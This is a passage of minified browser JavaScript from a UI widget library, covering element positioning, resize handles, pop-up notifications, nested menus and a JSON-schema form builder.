bottom",of:{},collision:"flip",within:window,transform:!1,overflow:"none"},m=$extend(p,o),h=n(m.my,e),g=n(m.at,m.of),v=g.top-h.top-i.top,y=g.left-h.left-i.left,_={x:0,y:0,h:0,w:0},b={};$io.isWindow(m.within)||!m.within?(_.h=window.innerHeight,_.w=window.innerWidth):(b=m.within.getBoundingClientRect(),_.x=b.left,_.y=b.top,_.h=m.within.offsetHeight,_.w=m.within.offsetWidth),e.offsetHeight>_.h&&(d=m.of.getBoundingClientRect().top-_.y,f=_.h-d-m.of.offsetHeight,u=e.parentNode.isEqualNode(m.of)?_.h:f<d?d:f,e.style.height=u+"px",e.setAttribute("data-ui-menu-scroller",!0));var w=i.left==b.left?0:b.left,x=i.top==b.top?0:b.top,$=_.w-e.offsetWidth+w,E=_.h-e.offsetHeight+x;if(1===m.of.nodeType)var k=window.getComputedStyle(m.of,null),S=k.transform||k.webkitTransform||k.MozTransform||k.msTransform;if(S&&"none"!=S)e.style.transformOrigin=k.transformOrigin,s=function(){var t,n,o,r;r=0==i.left?(t=b.left,n=b.top,o=y,v):(n=t=0,o=y+b.left,v+b.top),e.style.left=m.of.offsetLeft+t+"px",e.style.top=m.of.offsetTop+n+"px",e.style.transform=S+" translateX("+o+"px) translateY("+r+"px)"};else if("fit"==m.collision)s=function(t,n){t=$<(t+=y)?$:t<w?w:t,n=E<(n+=v)?E:n<x?x:n,e.style.left=t+"px",e.style.top=n+"px"};else if("flip"==m.collision||"flipfit"==m.collision){var L=t(m.my,e),A=t(m.at,m.of),N=A.top-L.top-i.top,O=A.left-L.left-i.left;s="flipfit"==m.collision?function(t,n,o,i){($<(t+=y)||t<w)&&(t=o+O),(E<(n+=v)||n<x)&&(n=i+N),t=$<t?$:t<w?w:t,n=E<n?E:n<x?x:n,e.style.left=t+"px",e.style.top=n+"px"}:function(t,n,o,i){($<(t+=y)||t<w)&&(t=o+O),(E<(n+=v)||n<x)&&(n=i+N),e.style.left=t+"px",e.style.top=n+"px"}}else s=function(t,n){e.style.left=t+y+"px",e.style.top=n+v+"px"};function C(e){if(e||(e=m.of),1===e.nodeType){var t=e.getBoundingClientRect();l=t.left,c=t.top}else e.preventDefault&&(l=e.pageX,c=e.pageY);s(l,c,l,c)}return C(m.of),{update:C}}}(this),function(e){"use strict";var t=e.$noop||function(e){};function n(e,t){document.documentElement.addEventListener(e,t,!1)}function o(e,t){document.documentElement.removeEventListener(e,t,!1)}function i(e){var t=e.changedTouches?e.changedTouches[0]:null;return t?{x:t.clientX,y:t.clientY}:{x:e.clientX,y:e.clientY}}var r=document.createElement("div");r.style.position="absolute",r.style.zIndex="999",r.style.top="0",r.style.bottom="0",r.style.left="0",r.style.right="0",r.style.pointerEvents="auto",e.$resize=function(e,a){if("string"==typeof e&&(e=document.querySelector(e)),!e)throw new Error("$resize : element missing");if(!e.getAttribute("data-js-resize-init")){e.setAttribute("data-js-resize-init",!0);for(var s=e.parentNode;s&&s.parentNode&&9!==s.parentNode.nodeType&&"static"==window.getComputedStyle(s,null).position;)s=s.parentNode;"string"==typeof a&&(a={handles:a});var l=window.getComputedStyle(e,null),c=$extend({handles:"e, s, se",onstart:t,onresize:t,onstop:t},a),u="fixed"==l.position||"absolute"==l.position,d=e.getBoundingClientRect(),f=(d.top,d.left,[]);"static"!=l.position&&""!=l.position||(e.style.position="relative"),"all"==c.handles?f=["n","w","e","s","nw","ne","sw","se"]:c.handles.replace(/([^,\s]+)/g,(function(e,t){f.push(t)}));for(var p=[],m=0,h=f.length;m<h;m++)p.push(g(e,f[m]));return{destroy:function(){for(var e=0,t=p.length;e<t;e++)p[e].destroy()}}}function g(e,t){var a,s,l,d,f,p,m,h=r.cloneNode();t=t||"s";try{m=$io.fn.throttle(_,15)}catch(h){m=_}function g(o){o.preventDefault(),o.stopPropagation(),function(o){var r=i(o);a=r.x,s=r.y,l=e.offsetWidth,d=e.offsetHeight,f=e.offsetTop,p=e.offsetLeft,n("mousemove",m),n("touchmove",m),n("mouseup",y),n("touchend",y),n("contextmenu",v),function(){for(var e=document.querySelectorAll("iframe"),t=0,n=e.length;t<n;t++)e[t].dataset.oldPointerEvents=e[t].style.pointerEvents,e[t].style.pointerEvents="none"}(),function(e){e.dataset.oldTransform=e.style.transitionDuration,e.style.transitionDuration="0s"}(e),document.documentElement.style.cursor=t+"-resize",c.onstart&&c.onstart(e,o)}(o)}function v(e){e.preventDefault()}function y(t){document.documentElement.style.cursor="auto",function(){for(var e=document.querySelectorAll("iframe"),t=0,n=e.length;t<n;t++)e[t].style.pointerEvents=e[t].dataset.oldPointerEvents,delete e[t].dataset.oldPointerEvents}(),function(e){e.style.transitionDuration=e.dataset.oldTransform,delete e.dataset.oldTransform}(e),o("mousemove",m),o("touchmove",m),o("mouseup",y),o("touchend",y),o("contextmenu",v),c.onstop&&c.onstop(e,t)}function _(n){var o=i(n);if("s"!==t&&"se"!==t&&"sw"!==t||(e.style.height=d+o.y-s+"px"),"e"!==t&&"ne"!==t&&"se"!==t||(e.style.width=l+o.x-a+"px"),"n"===t||"ne"===t||"nw"===t){var r=o.y-s;u&&(e.style.top=f+r+"px"),e.style.height=d-r+"px"}"w"!==t&&"nw"!==t&&"sw"!==t||(r=o.x-a,u&&(e.style.left=p+r+"px"),e.style.width=l-r+"px"),c.onresize&&c.onresize(e,n)}return h.className="js-resizer js-resizer-"+t,"n"==t?(h.style.bottom="auto",h.style.height="6px",h.style.cursor="n-resize"):"s"==t?(h.style.top="auto",h.style.height="6px",h.style.cursor="s-resize"):"e"==t?(h.style.left="auto",h.style.width="6px",h.style.cursor="e-resize"):"w"==t?(h.style.right="auto",h.style.width="6px",h.style.cursor="w-resize"):"nw"==t?(h.style.bottom="auto",h.style.right="auto",h.style.height="6px",h.style.width="6px",h.style.cursor="nw-resize"):"ne"==t?(h.style.bottom="auto",h.style.left="auto",h.style.height="6px",h.style.width="6px",h.style.cursor="ne-resize"):"sw"==t?(h.style.top="auto",h.style.right="auto",h.style.height="6px",h.style.width="6px",h.style.cursor="sw-resize"):"se"==t&&(h.style.top="auto",h.style.left="auto",h.style.height="6px",h.style.width="6px",h.style.cursor="se-resize"),e.appendChild(h),h.addEventListener("mousedown",g,!1),h.addEventListener("touchstart",g,!1),{destroy:function(){h.removeEventListener("mousedown",g,!1),h.removeEventListener("touchstart",g,!1),h.parentNode&&h.parentNode.removeChild(h)}}}}}(this),function(e){"use strict";function t(e,t){e.className="ui_notif animated fadeOut",setTimeout((function(){e.parentNode&&e.parentNode.removeChild(e)}),t?150:500)}var n={default:document.body,dest:document.body},o=[];function i(e,i){"string"==typeof e&&("string"==typeof i?(e={title:e,text:i},i=null):e={text:e});var r=$extend({},n,e);i||(i=r.default);var a,s=r.dest;r.text=r.text||r.description||r.body||"";var l=i.getAttribute("data-js-notif-id");if(l)a=o[l];else{a=document.createElement("div"),s.appendChild(a),a.style.zIndex=99999;var c=i.getBoundingClientRect();a.style.position="fixed",a.style.bottom=window.innerHeight-~~(c.top+c.height/2)+"px",a.style.right=window.innerWidth-~~(c.left+c.width/2)+"px",i.setAttribute("data-js-notif-id",o.push(a)-1)}var u=document.createElement("div"),d=document.createElement("b"),f=(c=document.createElement("p"),document.createElement("span"));u.style.visibility="hidden",u.className="ui_notif",f.innerHTML="&times;";var p=0;r.title&&(d.innerHTML=r.title,u.appendChild(d),p+=r.title.length),c.innerHTML=r.text,p+=r.text.length,u.appendChild(c),u.appendChild(f),!(f.onclick=function(){t(u,!0)})!==r.delay&&(u.onmouseover=function(){clearTimeout(m)},u.onmouseout=function(){g()}),setTimeout((function(){u.style.visibility="visible",u.className="ui_notif animated fadeIn"}),100),a.appendChild(u),p/=5;var m,h=r.speed||p/3*1e3;function g(){m=setTimeout((function(){t(u)}),h+2e3)}!1!==r.delay&&g()}document.createElement("div"),i.config=function(e){$extend(n,e)},e.$notif=i}(this),function(e){"use strict";var t=document.createElement("div"),n=document.createElement("ul"),o=document.createElement("li"),i=document.createElement("span"),r=0,a=0;function s(e){e.setAttribute("aria-hidden",!1),e.setAttribute("aria-expanded",!0),e.classList.add("ui_menu--open")}function l(e){e.setAttribute("aria-hidden",!0),e.setAttribute("aria-expanded",!1),e.classList.remove("ui_menu--open")}n.setAttribute("role","menu"),o.setAttribute("role","menuitem"),o.setAttribute("tabindex","-1"),o.className="ui_menu__item",i.className="ui_menu__item__text";var c,u,d,f,p={},m={};function h(e){p[e]||(p[e]=!0,document.addEventListener("mousedown",(function t(n){for(var o=n.target;o&&o.id!==e;)o=o.parentNode;o||(g(),document.removeEventListener("mousedown",t,!0),p[e]=!1)}),!0))}function g(e){var t=!0;"select"===e&&(t=!1,e=null);var n=(e||document).querySelectorAll(".ui_menu__item--focus"),o=(e||document).querySelectorAll(".ui_menu--open"),i=(e||document).querySelectorAll(".ui_menu--scroller");$io.arr.all(n,(function(e){m[e.parentNode.parentNode.id]=!1,e.classList.remove("ui_menu__item--focus")})),$io.arr.all(o,(function(e){l(e)})),$io.arr.all(i,(function(e){e.removeAttribute("style"),e.classList.remove("ui_menu--scroller"),e.classList.contains("ui_menu--scroller--active")&&e.classList.remove("ui_menu--scroller--active"),e.removeEventListener("mouseover",v,!1)})),e||(t&&_.current&&_.current.cfg&&_.current.cfg.oncancel&&_.current.cfg.oncancel(),_.current&&_.current.cfg&&_.current.cfg.onclose&&_.current.cfg.onclose(),_.current=null)}function v(e){e.target.matches(".ui_menu__right_handler")?this.classList.remove("ui_menu--scroller--active"):this.classList.add("ui_menu--scroller--active")}!function(){var e,t,n=document.createElementNS("http://www.w3.org/2000/svg","svg"),o=document.createElementNS("http://www.w3.org/2000/svg","polygon");o.setAttribute("points","0,0 0,0 0,0"),o.setAttribute("fill","transparent"),o.style.cssText="pointer-events:auto;",n.style.cssText="pointer-events:none;position:fixed;top:0;left:0;bottom:0;right:0;width:100%;height:100%;z-index:1",n.appendChild(o),document.body.appendChild(n),document.addEventListener("mousemove",(function(e){d=t=i=e.pageX,f=r=e.pageY,r>=m.top+3&&r<=m.bottom-3&&o.setAttribute("points",i+","+r+" "+a+","+s+" "+l+","+p)})),o.onmousemove=function(n){!function(e,n){if(a===l)return i<a?a-e<=a-t:a-t<=a-e}(n.pageX,n.pageY)?h("fromTriangle"):(clearTimeout(e),e=setTimeout((function(){h("fromTriangle")}),100)),setTimeout((function(){t=n.pageX,n.pageY}),1)};var i,r,a,s,l,p,m={};function h(e){o.setAttribute("points","0,0 0,0 0,0"),setTimeout((function(){"fromTriangle"===e&&function(e,t){if(e.fireEvent)e.fireEvent("on"+t);else{var n=document.createEvent("Events");n.initEvent(t,!0,!1),e.dispatchEvent(n)}}(document.elementFromPoint(d,f),"mouseover")}),1)}c=function(e,o,c,u,d,f,h){m=e.getBoundingClientRect(),e.appendChild(n),t=i=o,r=c,a=u,s=d,l=f,p=h},u=h}();var y={mode:"popup",icons:"auto",recursive:!1,hide:!1,solo:!0,aim:!0,display:!0,closeOthers:!0,trigger:"mouseover",onclose:null,position:{within:window}};function _(e,d,f){$io.isElement(e)||(f=d||{},d=e,e=document.createElement("div")),d||(d=[]);var p,b="tree"===f.mode?$extend({},y,{closeOthers:!1,trigger:"click",position:!1}):"bar"===f.mode?$extend({},y,{}):y,w=$extend({},b,f),x=!1,$=!1,E={},k={};"tabs"===w.mode&&(x=!0,w.mode="bar"),"context"===w.mode&&($=!0,w.mode="popup"),w.thisArg||(w.thisArg=e);var S={};!function e(t){$io.obj.all(t,(function(t){t.key&&(S[t.key]=function(){return t.action.apply(this,arguments)}),"function"!=typeof t.items&&e(t.items)}))}(d);var L,A,N=$key(w.keyTarget||e).config({thisArg:w.thisArg,uniqueCombo:!0}).combo(S);if(w.key){var O={};O[w.key]=function(){D()},L=$key().combo(O)}e.classList.add("ui_menu_trigger"),(p=function e(s,c,u,d){if(!1===(u="function"==typeof u?u.call(c.thisArg):u))return!1;var f=document.createDocumentFragment(),p=t.cloneNode(!1),m=n.cloneNode(!1);if(p.appendChild(m),p.id="ui_menu_"+r++,!u)return!1;for(var h=0,g=u.length;h<g;h++)if(u[h]){if(!1!==("function"==typeof u[h].display?u[h].display.call(c.thisArg):u[h].display)){var v=u[h],y=o.cloneNode(!1);if("---"!==v.name){y.id="ui_menu__item_"+a++;var _=i.cloneNode(!1),b=document.createElement("span"),w=document.createElement("span"),x=null;if(w.className="ui_menu__item__ico",void 0!==v.radio?(w.className="ui_menu__item__ico ui_form-ico-radio",x=I(v.radio,y,v.action)):!0===v.checkbox&&(w.className="ui_menu__item__ico ui_form-ico-checkbox",x=j(y,v.action)),_.innerHTML="string"==typeof v.name?v.name:v,v.icon){if(0===v.icon.indexOf("."))($=document.createElement("div")).className="ui_menu__item__ico",v.icon.split(".").forEach((function(e){$.classList.add(e)}));else if(0===v.icon.indexOf("<")){($=document.createElement("div")).className="ui_menu__item__ico",$.innerHTML=v.icon}else{var $;($=new Image).src=v.icon}w.appendChild($)}else w.innerHTML="&nbsp;";if(y.appendChild(w),y.appendChild(_),v.key&&(b.innerHTML=v.key.replace(/(\+|^)[a-z]/g,(function(e){return e.toUpperCase()})),b.className="ui_menu__item__key",y.appendChild(b)),k[y.id]={item:y,val:v,action:x||v.action},R(s,y,v),v.items){y.setAttribute("aria-haspopup",!0),y.classList.add("ui_menu__item--opener");var S=function(t,n,o,i){return function(){var r=e(t,n,o.items,o);r||((r=document.createElement("div")).innerHTML='<ul><li class="ui_menu__item ui_menu__item--disabled"><em>No items...</em></ul></li>'),!(r.className="ui_menu__submenu")!==n.position&&l(r),i.appendChild(r)}}(s,c,v,y);!0===c.recursive?S():E[y.id]=S}f.appendChild(y)}else y.className="ui_menu__separator",y.appendChild(document.createElement("hr")),f.appendChild(y)}}return m.appendChild(f),p}(e,w,d)).className="ui_menu ui_menu--"+("inline"===w.mode||"popup"===w.mode?"menu":w.mode),p.setAttribute("tabindex","0"),p.style.zIndex=$maxZ(".ui_menu",p.parentNode).num+1,"popup"!==w.mode?x?(e.appendChild(p),w.dest?A=w.dest:((A=document.createElement("div")).className="ui_menu--tabs__content",e.appendChild(A))):e.appendChild(p):(document.body.appendChild(p),p.classList.add("ui_menu--popup"),l(p),$?e.addEventListener("contextmenu",D,!1):"auto"===w.trigger?D():w.trigger&&e.addEventListener("click",D,!1));var C,T={};function I(e,t,n){return T[e]?T[e].push(t):T[e]=[t],function(){for(var o,i=T[e],r=0,a=i.length;r<a;r++)i[r].setAttribute("data-menuitem-selected",!1),"function"!=typeof(o=k[i[r].id].val).selected&&(o.selected=!1);"function"!=typeof(o=k[t.id].val).selected&&(o.selected=!0),t.setAttribute("data-menuitem-selected",!0),n&&n.call(this,o)}}function j(e,t){return function(){var n="true"===e.getAttribute("data-menuitem-selected");e.setAttribute("data-menuitem-selected",!n);var o=k[e.id].val;if("function"!=typeof o.selected&&(o.selected=!n),t)return t.call(this,!n)}}function R(e,t,n){var o="function"==typeof n.display?n.display.call(w.thisArg):n.display,i="function"==typeof n.disabled?n.disabled.call(w.thisArg):n.disabled,r="function"==typeof n.selected?n.selected.call(w.thisArg):n.selected;t.style.display=!1===o?"none":"",i?t.classList.add("ui_menu__item--disabled"):t.classList.remove("ui_menu__item--disabled"),t.setAttribute("data-menuitem-selected",r)}function P(e){for(var t in k)if(k.hasOwnProperty(t)){var n=k[t];R(0,n.item,n.val)}}function D(t){if(t&&(t.stopImmediatePropagation(),t.preventDefault()),!p.classList.contains("ui_menu--open")){w.solo&&g(),_.current=H,s(p),p.style.zIndex=$maxZ(".ui_menu, .ui_icon, .ui_window").num+1;var n={collision:"flip",of:w.position.of||e,within:w.position.within};w.position.my&&(n.my=w.position.my),w.position.at&&(n.at=w.position.at),C=$pos(p,n),p.getAttribute("data-ui-menu-scroller")&&z(p),h(p.id)}}function z(e){function t(){0===e.scrollTop?n.disabled=!0:n.disabled=!1,e.scrollHeight-e.scrollTop===e.clientHeight?o.disabled=!0:o.disabled=!1}var n,o,i,r;if(e.classList.contains("ui_menu--scroller--active")&&e.classList.remove("ui_menu--scroller--active"),e.classList.add("ui_menu--scroller"),1==e.childNodes.length){n=document.createElement("button"),o=document.createElement("button"),i=document.createElement("div"),n.className="ui_menu__up_handler",o.className="ui_menu__down_handler",i.className="ui_menu__right_handler";var a=e.firstChild.offsetWidth;n.style.width=o.style.width=a+"px",e.appendChild(n),e.appendChild(o),e.appendChild(i),r=e.getBoundingClientRect(),n.style.top=r.top+"px",o.style.bottom=window.innerHeight-e.offsetHeight-r.top+"px",i.style.left=r.left+a+"px",n.onclick=function(){e.scrollTop-=80,t()},o.onclick=function(){e.scrollTop+=80,t()},e.onscroll=function(){t()},t()}!function(e){e.addEventListener("mouseover",v,!1),e.querySelector(".ui_menu__up_handler").addEventListener("mouseover",v,!1)}(e)}function M(e){for(var t=e.target;t&&"LI"!==t.tagName;)t=t.parentNode;t&&(!1!==w.position&&t.classList.contains("ui_menu__item--focus")||t.classList.contains("ui_menu__item--disabled")||$io.arr.each(t.parentNode.childNodes,(function(n){if(n.id==t.id){if(w.closeOthers&&g(n),"bar"==w.mode&&!m[p.id]&&t.parentNode.parentNode.id==p.id)return;if(n.classList.add("ui_menu__item--focus"),n.classList.contains("ui_menu__item--opener")&&!n.classList.contains("ui_menu__item--disabled")){E[t.id]&&E[t.id]();var o=n.lastChild;if(!1===w.position)!function(e,t){t.classList.contains("ui_menu--open")?(l(t),e.classList.remove("ui_menu__item--focus")):s(t)}(n,o);else{o.style.position="fixed",s(o);var i="bar"==w.mode&&t.parentNode.parentNode.id==p.id;if($pos(o,{my:"left top-1",at:i?"left bottom":"right top",of:n,collision:"flipfit",within:w.position.within||window}),o.getAttribute("data-ui-menu-scroller")&&z(o),w.aim){var r=o.getBoundingClientRect();i?e.pageY<r.bottom?c(n,e.pageX,e.pageY,r.left,r.top,r.right,r.top):c(n,e.pageX,e.pageY,r.left,r.bottom,r.right,r.bottom):e.pageX<r.left?c(n,e.pageX,e.pageY,r.left,r.top,r.left,r.bottom):c(n,e.pageX,e.pageY,r.right,r.top,r.right,r.bottom)}h(p.id)}}else u(!0)}else w.closeOthers&&(n.classList.remove("ui_menu__item--focus"),g(n))})))}var B="auto"==w.trigger?"mouseover":w.trigger;function F(e){if("bar"==w.mode&&(m[p.id]?(m[p.id]=!1,g()):(m[p.id]=!0,M(e))),!this.classList.contains("ui_menu__item--disabled")){var t=k[this.id].action,n=typeof t;!x||"string"!=n&&"function"!=n||(A.innerHTML="function"==n?t.call(w.thisArg):t,g()),"function"==n&&!1!==t.call(w.thisArg,e,k[this.id].val)&&g("select")}}B||(B="mouseover"),p.addEventListener(B,M,!1),p.onfocus=function(e){var t=p.querySelector(".ui_menu__item");F.call(t,{target:t})},m[p.id]=!1,p.onblur=function(e){g()},$el(p).on("click",".ui_menu__item",F);var H={cfg:w,destroy:function(){$el(p).off("click",".ui_menu__item",F),p.removeEventListener(B,M,!1),k=E=null,N&&N.destroy&&N.destroy(),L&&L.destroy&&L.destroy()},refresh:function(e){e&&(w.thisArg=e),P(w.thisArg)},show:function(e,t){e&&(w.thisArg=e,N.config({thisArg:e}),P()),t&&(w.position=t),D()},setThisArg:function(e){e&&(w.thisArg=e,P())},key:N,position:C};return H}_.config=function(e){$extend(y,e)},_.extend=function(e,t){var n=$extend([],e);return $io.obj.all(t,(function(e,t){t.replace(/^((after|before|replace|delete|extend):)?(([\d.]+)|(.*))/,(function(t,o,i,r,a,s){if(a){var l=a.split("."),c=+l.pop(),u=n;$io.arr.all(l,(function(e){var t=+e;u=u[t].items?u[t].items:u[t]}))}else if(s){var d=function e(t,n){var o;return $io.arr.each(n,(function(i,r){return i.name===t?!(o={arr:n,pos:r}):(i.items&&(o=e(t,i.items)),!o&&void 0)})),o}(s,n);u=d.arr,c=d.pos}i&&"before"!==i?"after"===i?$io.arr.insert(u,e,c+1):"extend"===i?u[c]=$extend({},u[c],e[0]):"replace"===i?u[c]=e[0]:"delete"===i&&u.splice(c,1):$io.arr.insert(u,e,c)}))})),n},e.$menu=_}(window),function(e){var t=0,n=document.createElement("form"),o=document.createElement("legend"),i=document.createElement("div"),r=document.createElement("div"),a=document.createElement("label"),s=document.createElement("input"),l=document.createElement("textarea"),c=document.createElement("select"),u=(document.createElement("option"),document.createElement("button"));function d(e,t){if(e)for(var n=e.split(/\s+/),o=0,i=n.length;o<i;o++)t(n[o])}function f(e){$extend(this,e)}u.setAttribute("type","button"),l.setAttribute("rows",4),i.className="ui_form__tab",n.className="ui_form";var p=0;function m(e,t,n,h,v){var y=e.el,_=document.createDocumentFragment();if(!t)return{fragment:_};if("object"===t.type){var b=o.cloneNode(!0);($=i.cloneNode(!0)).className="ui_form__tab ui_form__object",$.id="ui_form__tab_"+e.id+"_"+p++,e.fields[h+"{}"]=R=new f({type:"object",path:h,fields:{},div:$}),(t.title||n)&&(b.textContent=t.title||n,$.appendChild(b));var w=r.cloneNode(!0);if(d(t.className,(function(e){w.classList.add(e),$.classList.add("ui_form__object--"+e.replace(/ui_form[-_]*/,""))})),t.description&&((j=document.createElement("div")).className="ui_form__description",j.innerHTML=t.description,$.appendChild(j)),$io.obj.each(t.properties,(function(t,n){var o=m(e,t,n,h?h+"."+n:n,v&&v.hasOwnProperty(n)?v[n]:null);R.fields[n]=o,w.appendChild(o.fragment)})),$.appendChild(w),t.help){var x=document.createElement("div");x.className="ui_form__help",x.innerHTML=t.help,$.appendChild(x)}$io.obj.all(t.plugin,(function(e,n){g.plugin[n]&&g.plugin[n].call(t,R,t.plugin[n],e)})),_.appendChild(R.div)}else if("array"===t.type){b=o.cloneNode(!0);var $,E=$=i.cloneNode(!0);$.className="ui_form__tab ui_form__array",$.id="ui_form__tab_"+e.id+"_"+p++,e.fields[h+"[]"]=R=new f({type:"array",path:h,div:$,addItem:O,reorder:L,setValue:function(e,t){$io.arr.all(document.querySelectorAll("#"+$.id+" .ui_form__array__item"),(function(e){e.remove()})),C=0,T=e.length;for(var n=[];C<T;){var o=O(e[C]);n.push(o),t(e[C-1],o)}return n}}),d(t.className,(function(e){$.classList.add(e)})),b.innerHTML=(t.title||n)+"&nbsp;";var k=u.cloneNode(!0);k.className="ui_form__array_btn ui_form__btn_add",k.innerHTML=g.default.add,k.onclick=function(){O()},b.appendChild(k);var S=s.cloneNode();function L(){for(var e,t=y.querySelectorAll("[name]"),n=[],o=0,i=0,r=t.length;i<r;i++){for(var a=t[i],s=-1,l=null,c=a.parentNode;c&&1==c.nodeType;)c.classList.contains("ui_form__array__item")&&(l||(l=c),s++),c=c.parentNode;if(-1<s){void 0===n[s]&&(n[s]=-1),e!==l&&(o<s?n[s]=0:n[s]++);var u=a.name,d=0,f=u.replace(/(\.?)(\d+)(?![^.\s])/g,(function(e,t,o){return t+n[d++]}));a.name=f,a.id="ui_form__"+f,e=l,o=s}else n.length=0}}function A(e){for(var t=[],n=0,o=E.children.length;n<o;n++)E.children[n].classList.contains("ui_form__array__item")&&t.push(E.children[n]);if(e)var i,r;for(i=0,r=t.length;i<r;i++){var a="ui_form_temp"+i+(Math.random()+"").slice(2);t[i].id=a,E.querySelector("#"+a+" > .ui_form__array__btns > .ui_form__btn_up").disabled=0===i,E.querySelector("#"+a+" > .ui_form__array__btns > .ui_form__btn_down").disabled=i===r-1,t[i].id=""}L()}function N(e,t,n){var o=u.cloneNode();o.className="ui_form__array_btn ui_form__btn_"+t,o.innerHTML=g.default[t],o.onclick=n,e.appendChild(o)}function O(n){var o=document.createElement("div");o.className="ui_toolbar ui_form__array__item";var i=m(e,t.items,"",h+"."+C++,n);o.appendChild(i.fragment);var r=document.createElement("div");return r.className="ui_form__array__btns",N(r,"remove",(function(){o.remove(),A()})),N(r,"up",(function(){E.insertBefore(o,o.previousSibling),A()})),N(r,"down",(function(){E.insertBefore(o,o.nextSibling.nextSibling),A()})),o.appendChild(r),E.appendChild(o),A(!0),i}S.name=h,S.value=h,S.setAttribute("data-is-array",!0),b.appendChild(S),$.appendChild(b),v||(v=[]);for(var C=0,T=v.length;C<T;)O(v[C]);$io.obj.all(t.plugin,(function(e,n){g.plugin[n]&&g.plugin[n].call(t,R,t.plugin[n],e)})),_.appendChild(R.div)}else{if("string"!==t.type&&"boolean"!==t.type&&"number"!==t.type&&"integer"!==t.type)throw new Error("$form: unknown schema type : "+t.type);w=r.cloneNode();var I,j,R,P=a.cloneNode();w.className="ui_form__field",d(t.className,(function(e){w.classList.add(e)})),g.format[t.format]?I=g.format[t.format].call(t):t.enum?(I=c.cloneNode(),$io.arr.all(t.enum,(function(e){Array.isArray(e)?I.options[I.options.length]=new Option(e[0],e[1]):I.options[I.options.length]=new Option(e,e)}))):"textarea"===t.format?I=l.cloneNode():(I=s.cloneNode(),"string"===t.type&&(I.type="text"),"number"!==t.type&&"integer"!==t.type||(I.type="number")),"boolean"===t.type?(I.type="checkbox","boolean"==typeof v?I.checked=v:t.default&&(I.checked=t.default),document.createElement("span")):null!=v?I.value=v:t.default&&(I.value=t.default),t.placeholder&&(I.placeholder=t.placeholder),!0!==t.ignore&&(I.name=h),I.id="ui_form__"+h,P.setAttribute("for","ui_form__"+h),P.innerHTML=t.title||n,t.pattern&&I.setAttribute("pattern",t.pattern),t.attributes&&$io.obj.all(t.attributes,(function(e,n){"required"===n&&t.required,"function"==typeof e?I[n]=e:I.setAttribute(n,e)})),!0===t.required&&(P.innerHTML=P.innerHTML+' <span title="required" class="ui_form__required">*</span>',I.required=!0),t.description&&((j=document.createElement("div")).className="ui_form__description",j.innerHTML=t.description),(!0===e.cfg.disabled||!0===t.disabled||!0===t.createOnly&&!1===e.cfg.create)&&("text"===I.type?I.classList.add("disabled"):I.disabled=!0),e.fields[h]=R=new f({type:t.type,path:h,div:w,input:I,actionZone:I,label:P,getValue:function(){return this.input.value},setValue:function(e){this.input.value=e},setFocus:function(){this.input.focus()},onFocus:function(e){this.input.onfocus=e},onBlur:function(e){this.input.onblur=e},onModif:function(e){this.input.oninput=this.input.onkeyup=this.input.onchange=e}}),g.type[t.type]&&"function"==typeof g.type[t.type]&&D(R,"type",t.type),t.plugin=t.plugin||[],t.format&&g.plugin[t.format]&&(t.plugin[t.format]=!0),$io.obj.all(t.plugin,(function(e,t){g.plugin[t]&&D(R,"plugin",t)})),"boolean"===t.type?(R.div.appendChild(R.actionZone),R.div.appendChild(R.label),j&&R.div.appendChild(j)):(R.div.appendChild(R.label),j&&R.div.appendChild(j),R.div.appendChild(R.actionZone)),t.hidden&&R.div.classList.add("hide"),_.appendChild(R.div)}function D(e,n,o){return g[n][o].call(t,e,$extend({},t[n][o]))}return Object.defineProperty(R,"fragment",{get:function(){return delete R.fragment,_},configurable:!0}),R}var h="string number boolean null".split(" ");function g(e,t){return"FORM"==e.nodeName?g.data(e):g.build(e,t)}function v(e){var t=e.getAttribute("data-form-id");if(t&&g.instances[t]){var n=g.instances[t].fields;for(var o in n)n.hasOwnProperty(o)&&n[o].save&&n[o].save()}}g.instances={},g.build=function(e,o){p=0;var i=$extend({},o),r=t++,a=n.cloneNode(),s="ui_form_"+r;a.id=s,a.setAttribute("data-form-id",r),e.schema||(e.schema=function e(t,n){n={};var o=typeof t;return-1<h.indexOf(o)?n.type=o:Array.isArray(t)?(n.type="array",n.items=e(t[0])):$io.isObject(t)&&(n.type="object",n.properties={},$io.obj.all(t,(function(t,o){n.properties[o]=e(t)}))),n}(e),e.data=e),e.schema.type?e.schema=$extend({},e.schema):e.schema={type:"object",properties:$extend({},e.schema)},e.schema=function e(t){return t.properties&&$io.obj.all(t.properties,(function(n,o){"object"===n.type&&(n=e(n)),t.required&&-1<t.required.indexOf(o)&&(n.required=!0)})),t}(e.schema);var l,c=g.instances[r]={id:r,el:a,cfg:i,schema:e.schema,data:e.data,fields:{},destroy:function(){this.el.remove(),delete g.instances[r]}};l=e.data?m(c,e.schema,"","",$extend({},e.data)).fragment:m(c,e.schema,"","").fragment;var u=document.createElement("button");return u.type="submit",u.style.display="none",l.appendChild(u),a.appendChild(l),c},g.onvalidate=function(e,t){console.log(e,t)},g.validate=function(e){v(e);var t=!0,n="FORM"===e.tagName?e.elements:e.length?e:[e];return $io.arr.each(n,(function(e,n){e.validity.valid||(t=!1,g.onvalidate(e.validationMessage,e),0===n&&(e.select(),e.focus()))})),t},g.data=function(e){v(e);var t,n,o={};return $io.arr.all(e.elements,(function(e){if(""!==e.name&&!e.disabled)if("checkbox"===e.type)$io.obj.path(o,e.name,!!e.checked);else if("number"===e.type)$io.obj.path(o,e.name,parseInt(e.value));else if("select-multiple"===e.type){for(t=[],n=e.options.length-1;0<=n;n-=1)e.options[n].selected&&t.push(e.options[n].value);$io.obj.path(o,e.name,t)}else e.getAttribute("data-is-array")?$io.obj.path(o,e.name,[]):$io.obj.path(o,e.name,e.value)})),o},g.update=function(e,t){console.warn("WARNING - TODO $form.update() with array"),t?$io.obj.all(t,(function(t,n){e[n]&&(e[n].value=t)})):$io.arr.all(e.elements,(function(e){e.value=""}))},g.disable=function(e){$io.arr.all(e.elements,(function(e){e.disabled&&(e.wasDisbled=!0),e.disabled=!0}))},g.enable=function(e){$io.arr.all(e.elements,(function(e){e.wasDisbled||(e.disabled=!1)}))},g.plugin={},g.format={},g.type={},g.default={add:"+",remove:"-",up:"up",down:"down"},e.$form=g}(this),function(e){"use strict";$form.plugin.explorer=function(e,t){var n=document.createElement("div");return e.btn=document.createElement("button"),e.btn.innerHTML='<img height=16 width=16 src="'+le._path.skin+'places/16/folder-open.png">',n.className="ui_form_combo 